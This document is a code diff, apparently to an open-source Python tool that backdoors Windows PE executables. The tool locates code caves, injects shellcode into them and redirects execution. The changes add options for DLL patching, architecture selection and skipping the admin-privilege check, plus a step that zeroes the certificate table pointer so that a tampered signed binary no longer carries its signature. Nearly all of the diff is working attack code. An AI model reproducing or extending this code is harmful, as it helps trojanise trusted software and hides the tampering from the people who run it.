@@ -44,28 +44,28 @@ from intel.WinIntelPE64 import winI64_shellcode
 
 
 MachineTypes = {'0x0': 'AnyMachineType',
-                    '0x1d3': 'Matsushita AM33',
-                    '0x8664': 'x64',
-                    '0x1c0': 'ARM LE',
-                    '0x1c4': 'ARMv7',
-                    '0xaa64': 'ARMv8 x64',
-                    '0xebc': 'EFIByteCode',
-                    '0x14c': 'Intel x86',
-                    '0x200': 'Intel Itanium',
-                    '0x9041': 'M32R',
-                    '0x266': 'MIPS16',
-                    '0x366': 'MIPS w/FPU',
-                    '0x466': 'MIPS16 w/FPU',
-                    '0x1f0': 'PowerPC LE',
-                    '0x1f1': 'PowerPC w/FP',
-                    '0x166': 'MIPS LE',
-                    '0x1a2': 'Hitachi SH3',
-                    '0x1a3': 'Hitachi SH3 DSP',
-                    '0x1a6': 'Hitachi SH4',
-                    '0x1a8': 'Hitachi SH5',
-                    '0x1c2': 'ARM or Thumb -interworking',
-                    '0x169': 'MIPS little-endian WCE v2'
-                    }
+                '0x1d3': 'Matsushita AM33',
+                '0x8664': 'x64',
+                '0x1c0': 'ARM LE',
+                '0x1c4': 'ARMv7',
+                '0xaa64': 'ARMv8 x64',
+                '0xebc': 'EFIByteCode',
+                '0x14c': 'Intel x86',
+                '0x200': 'Intel Itanium',
+                '0x9041': 'M32R',
+                '0x266': 'MIPS16',
+                '0x366': 'MIPS w/FPU',
+                '0x466': 'MIPS16 w/FPU',
+                '0x1f0': 'PowerPC LE',
+                '0x1f1': 'PowerPC w/FP',
+                '0x166': 'MIPS LE',
+                '0x1a2': 'Hitachi SH3',
+                '0x1a3': 'Hitachi SH3 DSP',
+                '0x1a6': 'Hitachi SH4',
+                '0x1a8': 'Hitachi SH5',
+                '0x1c2': 'ARM or Thumb -interworking',
+                '0x169': 'MIPS little-endian WCE v2'
+                }
 
 #What is supported:
 supported_types = ['Intel x86', 'x64']
@@ -75,7 +75,8 @@ class pebin():
     def __init__(self, FILE, OUTPUT, SHELL, NSECTION='sdata', DISK_OFFSET=0, ADD_SECTION=False,
                 CAVE_JUMPING=False, PORT=8888, HOST="127.0.0.1", SUPPLIED_SHELLCODE=None, 
                 INJECTOR = False, CHANGE_ACCESS = True, VERBOSE=False, SUPPORT_CHECK=False, 
-                SHELL_LEN=300, FIND_CAVES=False, SUFFIX=".old", DELETE_ORIGINAL=False):
+                SHELL_LEN=300, FIND_CAVES=False, SUFFIX=".old", DELETE_ORIGINAL=False, CAVE_MINER=False,
+                IMAGE_TYPE="ALL", ZERO_CERT=True, CHECK_ADMIN=False, PATCH_DLL=True):
         self.FILE = FILE
         self.OUTPUT = OUTPUT;
         self.SHELL = SHELL
@@ -86,7 +87,6 @@ class pebin():
         self.PORT = PORT
         self.HOST = HOST
         self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
-        self.flItms = {}
         self.INJECTOR = INJECTOR
         self.CHANGE_ACCESS = CHANGE_ACCESS
         self.VERBOSE = VERBOSE
@@ -95,6 +95,12 @@ class pebin():
         self.FIND_CAVES = FIND_CAVES
         self.SUFFIX = SUFFIX
         self.DELETE_ORIGINAL = DELETE_ORIGINAL
+        self.CAVE_MINER = CAVE_MINER
+        self.IMAGE_TYPE = IMAGE_TYPE
+        self.ZERO_CERT = ZERO_CERT
+        self.CHECK_ADMIN = CHECK_ADMIN
+        self.PATCH_DLL = PATCH_DLL
+        self.flItms = {}
        
 
     def run_this(self):
@@ -124,8 +130,7 @@ class pebin():
                 print "%s is not supported." % self.FILE
             else:
                 print "%s is supported." % self.FILE
-                if self.flItms['runas_admin'] is True:
-                        print "%s must be run as admin." % self.FILE
+                
             sys.exit()
         self.output_options()
         return self.patch_pe()
@@ -155,12 +160,12 @@ class pebin():
         self.flItms['COFF_Start'] = self.flItms['pe_header_location'] + 4
         self.binary.seek(self.flItms['COFF_Start'])
         self.flItms['MachineType'] = struct.unpack('<H', self.binary.read(2))[0]
-        for mactype, name in MachineTypes.iteritems():
-            if int(mactype, 16) == self.flItms['MachineType']:
-                if self.VERBOSE is True:
-                    print 'MachineType is:', name
-        #self.binary.seek(self.flItms['ImportTableLocation'])
-        #self.flItms['IATLocInCode'] = struct.unpack('<I', self.binary.read(4))[0]
+        if self.VERBOSE is True:
+            for mactype, name in MachineTypes.iteritems():
+                if int(mactype, 16) == self.flItms['MachineType']:
+                        print 'MachineType is:', name
+        #self.binary.seek(self.flItms['BoundImportLocation'])
+        #self.flItms['BoundImportLOCinCode'] = struct.unpack('<I', self.binary.read(4))[0]
         self.binary.seek(self.flItms['COFF_Start'] + 2, 0)
         self.flItms['NumberOfSections'] = struct.unpack('<H', self.binary.read(2))[0]
         self.flItms['TimeDateStamp'] = struct.unpack('<I', self.binary.read(4))[0]
@@ -178,14 +183,14 @@ class pebin():
         self.flItms['MinorLinkerVersion'] = struct.unpack("!B", self.binary.read(1))[0]
         self.flItms['SizeOfCode'] = struct.unpack("<I", self.binary.read(4))[0]
         self.flItms['SizeOfInitializedData'] = struct.unpack("<I", self.binary.read(4))[0]
-        self.flItms['SizeOfUninitializedData'] = struct.unpack("<i",
+        self.flItms['SizeOfUninitializedData'] = struct.unpack("<I",
                                                           self.binary.read(4))[0]
         self.flItms['AddressOfEntryPoint'] = struct.unpack('<I', self.binary.read(4))[0]
-        self.flItms['BaseOfCode'] = struct.unpack('<i', self.binary.read(4))[0]
+        self.flItms['BaseOfCode'] = struct.unpack('<I', self.binary.read(4))[0]
         #print 'Magic', self.flItms['Magic']
         if self.flItms['Magic'] != int('20B', 16):
             #print 'Not 0x20B!'
-            self.flItms['BaseOfData'] = struct.unpack('<i', self.binary.read(4))[0]
+            self.flItms['BaseOfData'] = struct.unpack('<I', self.binary.read(4))[0]
         # End Standard Fields section of Optional Header
         # Begin Windows-Specific Fields of Optional Header
         if self.flItms['Magic'] == int('20B', 16):
@@ -227,31 +232,35 @@ class pebin():
         # End Windows-Specific Fields of Optional Header
         # Begin Data Directories of Optional Header
         self.flItms['ExportTable'] = struct.unpack('<Q', self.binary.read(8))[0]
+        self.flItms['ImportTableLOCInPEOptHdrs'] = self.binary.tell()
         self.flItms['ImportTable'] = struct.unpack('<Q', self.binary.read(8))[0]
         self.flItms['ResourceTable'] = struct.unpack('<Q', self.binary.read(8))[0]
         self.flItms['ExceptionTable'] = struct.unpack('<Q', self.binary.read(8))[0]
+        self.flItms['CertTableLOC'] = self.binary.tell()
         self.flItms['CertificateTable'] = struct.unpack('<Q', self.binary.read(8))[0]
+        
         self.flItms['BaseReLocationTable'] = struct.unpack('<Q', self.binary.read(8))[0]
         self.flItms['Debug'] = struct.unpack('<Q', self.binary.read(8))[0]
         self.flItms['Architecutre'] = struct.unpack('<Q', self.binary.read(8))[0]  # zero
         self.flItms['GlobalPrt'] = struct.unpack('<Q', self.binary.read(8))[0]
         self.flItms['TLS Table'] = struct.unpack('<Q', self.binary.read(8))[0]
         self.flItms['LoadConfigTable'] = struct.unpack('<Q', self.binary.read(8))[0]
-        self.flItms['ImportTableLocation'] = self.binary.tell()
-        #print 'ImportTableLocation', hex(self.flItms['ImportTableLocation'])
+        self.flItms['BoundImportLocation'] = self.binary.tell()
+        #print 'BoundImportLocation', hex(self.flItms['BoundImportLocation'])
         self.flItms['BoundImport'] = struct.unpack('<Q', self.binary.read(8))[0]
-        self.binary.seek(self.flItms['ImportTableLocation'])
-        self.flItms['IATLocInCode'] = struct.unpack('<I', self.binary.read(4))[0]
-        #print 'first IATLOCIN CODE', hex(self.flItms['IATLocInCode'])
-        self.flItms['IATSize'] = struct.unpack('<I', self.binary.read(4))[0]
-        #print 'IATSize', hex(self.flItms['IATSize'])
+        self.binary.seek(self.flItms['BoundImportLocation'])
+        self.flItms['BoundImportLOCinCode'] = struct.unpack('<I', self.binary.read(4))[0]
+        #print 'first IATLOCIN CODE', hex(self.flItms['BoundImportLOCinCode'])
+        self.flItms['BoundImportSize'] = struct.unpack('<I', self.binary.read(4))[0]
+        #print 'BoundImportSize', hex(self.flItms['BoundImportSize'])
         self.flItms['IAT'] = struct.unpack('<Q', self.binary.read(8))[0]
         self.flItms['DelayImportDesc'] = struct.unpack('<Q', self.binary.read(8))[0]
         self.flItms['CLRRuntimeHeader'] = struct.unpack('<Q', self.binary.read(8))[0]
         self.flItms['Reserved'] = struct.unpack('<Q', self.binary.read(8))[0]  # zero
         self.flItms['BeginSections'] = self.binary.tell()
-        
+
         if self.flItms['NumberOfSections'] is not 0:
+        
             self.flItms['Sections'] = []
             for section in range(self.flItms['NumberOfSections']):
                 sectionValues = []
@@ -303,9 +312,9 @@ class pebin():
 
         self.flItms['VrtStrtngPnt'] = (self.flItms['AddressOfEntryPoint'] +
                                       self.flItms['ImageBase'])
-        self.binary.seek(self.flItms['IATLocInCode'])
-        self.flItms['ImportTableALL'] = self.binary.read(self.flItms['IATSize'])
-        self.flItms['NewIATLoc'] = self.flItms['IATLocInCode'] + 40
+        self.binary.seek(self.flItms['BoundImportLOCinCode'])
+        self.flItms['ImportTableALL'] = self.binary.read(self.flItms['BoundImportSize'])
+        self.flItms['NewIATLoc'] = self.flItms['BoundImportLOCinCode'] + 40
         #return self.flItms
 
     
@@ -373,9 +382,9 @@ class pebin():
         self.flItms['NewSizeOfImage'] = (self.flItms['VirtualSize'] +
                                     self.flItms['SizeOfImage'])
         self.binary.write(struct.pack('<I', self.flItms['NewSizeOfImage']))
-        self.binary.seek(self.flItms['ImportTableLocation'])
-        if self.flItms['IATLocInCode'] != 0:
-            self.binary.write(struct.pack('=i', self.flItms['IATLocInCode'] + 40))
+        self.binary.seek(self.flItms['BoundImportLocation'])
+        if self.flItms['BoundImportLOCinCode'] != 0:
+            self.binary.write(struct.pack('=i', self.flItms['BoundImportLOCinCode'] + 40))
         self.binary.seek(self.flItms['BeginSections'] +
                40 * self.flItms['NumberOfSections'], 0)
         self.binary.write(self.flItms['NewSectionName'] +
@@ -559,16 +568,16 @@ class pebin():
                 JMPtoCodeAddress = (section[2] + caves[0] - section[4] -
                                     5 - self.flItms['AddressOfEntryPoint'])
                 try:
-                    pickACave[i] = ["None", hex(caves[0]), hex(caves[1]),
-                                    caves[1] - caves[0], "None",
-                                    "None", JMPtoCodeAddress]
+                    pickACave[i] = [None, hex(caves[0]), hex(caves[1]),
+                                    caves[1] - caves[0], None,
+                                    None, JMPtoCodeAddress]
                 except:
                     print "EOF"
 
         print ("############################################################\n"
                "The following caves can be used to inject code and possibly\n"
                "continue execution.\n"
-               "**Don't like what you see? Use jump, single, or append.**\n"
+               "**Don't like what you see? Use jump, single, append, or ignore.**\n"
                "############################################################")
 
         CavesPicked = {}
@@ -586,14 +595,20 @@ class pebin():
                                                                    details[6]))
 
             while True:
+                try:
+                    self.CAVE_MINER_TRACKER
+                except:
+                    self.CAVE_MINER_TRACKER = 0
+
                 print "*" * 50
                 selection = raw_input("[!] Enter your selection: ")
                 try:
                     selection = int(selection)
+                    
                     print "Using selection: %s" % selection
                     try:
                         if self.CHANGE_ACCESS is True:
-                            if pickACave[selection][0] != "None":
+                            if pickACave[selection][0] != None:
                                 self.change_section_flags(pickACave[selection][0])
                         CavesPicked[k] = pickACave[selection]
                         break
@@ -602,7 +617,8 @@ class pebin():
                         print "-User selection beyond the bounds of available caves...appending a code cave"
                         return None
                 except Exception as e:
-                    if selection.lower() == 'append' or selection.lower() == 'jump' or selection.lower() == 'single':
+		    breakOutValues = ['append', 'jump', 'single', 'ignore', 'a', 'j', 's', 'i']
+                    if selection.lower() in breakOutValues: 
                         return selection
         return CavesPicked
 
@@ -615,6 +631,7 @@ class pebin():
         """
         #g = open(flItms['filename'], "rb")
         runas_admin = False
+        print "[*] Checking Runas_admin"
         if 'rsrcPointerToRawData' in self.flItms:
             self.binary.seek(self.flItms['rsrcPointerToRawData'], 0)
             search_lngth = len('requestedExecutionLevel level="highestAvailable"')
@@ -626,6 +643,10 @@ class pebin():
                     runas_admin = True
                     break
                 data_read += 1
+        if runas_admin is True:
+            print "[*] %s must run with highest available privileges" % self.FILE
+        else:
+            print "[*] %s does not require highest available privileges" % self.FILE
 
         return runas_admin
 
@@ -654,13 +675,20 @@ class pebin():
         else:
             self.flItms['supported'] = True
         targetFile = intelCore(self.flItms, self.binary, self.VERBOSE)
-        if self.flItms['Magic'] == int('20B', 16):
+        if self.flItms['Characteristics'] - 0x2000 > 0 and self.PATCH_DLL is False:
+            return False
+        if self.flItms['Magic'] == int('20B', 16) and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x64'):
+            #if self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x64':
             self.flItms, self.flItms['count_bytes'] = targetFile.pe64_entry_instr()
-        elif self.flItms['Magic'] == int('10b', 16):
+        elif self.flItms['Magic'] == int('10b', 16) and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x32'):
+            #if self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x32':
             self.flItms, self.flItms['count_bytes'] = targetFile.pe32_entry_instr()
         else:
             self.flItms['supported'] = False
-        self.flItms['runas_admin'] = self.runas_admin()
+        #This speeds things up, MAKE IT OPTIONAL
+        #CONFIG
+        if self.CHECK_ADMIN is True:
+            self.flItms['runas_admin'] = self.runas_admin()
 
         if self.VERBOSE is True:
             self.print_flItms(self.flItms)
@@ -720,11 +748,12 @@ class pebin():
         self.flItms['shellcode_length'] = shellcode_length + len(self.flItms['resumeExe'])
 
         caves_set = False
-        while caves_set is False:
-            if self.flItms['NewCodeCave'] is False:
+        while caves_set is False and self.flItms['NewCodeCave'] is False:
+            #if self.flItms['NewCodeCave'] is False:
                 #self.flItms['JMPtoCodeAddress'], self.flItms['CodeCaveLOC'] = (
-                self.flItms['CavesPicked'] = self.find_cave()
-                if self.flItms['CavesPicked'] is None:
+            self.flItms['CavesPicked'] = self.find_cave()
+            if type(self.flItms['CavesPicked']) == str:
+                if self.flItms['CavesPicked'].lower() in ['append', 'a']:
                     self.flItms['JMPtoCodeAddress'] = None
                     self.flItms['CodeCaveLOC'] = 0
                     self.flItms['cave_jumping'] = False
@@ -732,36 +761,30 @@ class pebin():
                     print "-resetting shells"
                     self.set_shells()
                     caves_set = True
-                elif type(self.flItms['CavesPicked']) == str:
-                    if self.flItms['CavesPicked'].lower() == 'append':
-                        self.flItms['JMPtoCodeAddress'] = None
-                        self.flItms['CodeCaveLOC'] = 0
-                        self.flItms['cave_jumping'] = False
-                        self.flItms['CavesPicked'] = {}
-                        print "-resetting shells"
-                        self.set_shells()
-                        caves_set = True
-                    elif self.flItms['CavesPicked'].lower() == 'jump':
-                        self.flItms['JMPtoCodeAddress'] = None
-                        self.flItms['CodeCaveLOC'] = 0
-                        self.flItms['cave_jumping'] = True
-                        self.flItms['CavesPicked'] = {}
-                        print "-resetting shells"
-                        self.set_shells()
-                        continue
-                    elif self.flItms['CavesPicked'].lower() == 'single':
-                        self.flItms['JMPtoCodeAddress'] = None
-                        self.flItms['CodeCaveLOC'] = 0
-                        self.flItms['cave_jumping'] = False
-                        self.flItms['CavesPicked'] = {}
-                        print "-resetting shells"
-                        self.set_shells()
-                        continue
-                else:
-                    self.flItms['JMPtoCodeAddress'] = self.flItms['CavesPicked'].iteritems().next()[1][6]
-                    caves_set = True
+                elif self.flItms['CavesPicked'].lower() in ['jump', 'j']:
+                    self.flItms['JMPtoCodeAddress'] = None
+                    self.flItms['CodeCaveLOC'] = 0
+                    self.flItms['cave_jumping'] = True
+                    self.flItms['CavesPicked'] = {}
+                    print "-resetting shells"
+                    self.set_shells()
+                    continue
+                elif self.flItms['CavesPicked'].lower() in ['single', 's']:
+                    self.flItms['JMPtoCodeAddress'] = None
+                    self.flItms['CodeCaveLOC'] = 0
+                    self.flItms['cave_jumping'] = False
+                    self.flItms['CavesPicked'] = {}
+                    print "-resetting shells"
+                    self.set_shells()
+                    continue
+		elif self.flItms['CavesPicked'].lower() in ['ignore', 'i']:
+		    #Let's say we don't want to patch a binary
+		    return None
             else:
+                self.flItms['JMPtoCodeAddress'] = self.flItms['CavesPicked'].iteritems().next()[1][6]
                 caves_set = True
+            #else:
+            #    caves_set = True
 
         #If no cave found, continue to create one.
         if self.flItms['JMPtoCodeAddress'] is None or self.flItms['NewCodeCave'] is True:
@@ -813,10 +836,17 @@ class pebin():
                     self.binary.seek(int(self.flItms['CavesPicked'][i][1], 16))
                     self.binary.write(self.flItms['completeShellcode'])
 
+        #Patch certTable
+        if self.ZERO_CERT is True:
+            print "[*] Overwriting certificate table pointer"
+            self.binary.seek(self.flItms['CertTableLOC'],0)
+            self.binary.write("\x00\x00\x00\x00\x00\x00\x00\x00")
+        
         print "[*] {0} backdooring complete".format(self.FILE)
+        
         self.binary.close()
         if self.VERBOSE is True:
-            print_flItms(self.flItms)
+            self.print_flItms(self.flItms)
 
         return True
 
